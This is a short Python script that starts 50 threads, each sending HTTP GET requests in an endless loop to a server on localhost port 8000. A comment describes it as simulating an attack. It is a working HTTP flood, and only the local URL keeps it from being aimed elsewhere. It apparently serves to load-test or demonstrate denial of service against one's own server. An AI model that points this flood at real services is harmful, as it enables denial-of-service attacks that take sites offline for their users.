import requests
import threading

URL = "http://127.0.0.1:8000/"

def flood():
    while True:
        requests.get(URL)

threads = []
for _ in range(50):  # 50 concurrent threads simulating attack
    t = threading.Thread(target=flood)
    t.start()
    threads.append(t)
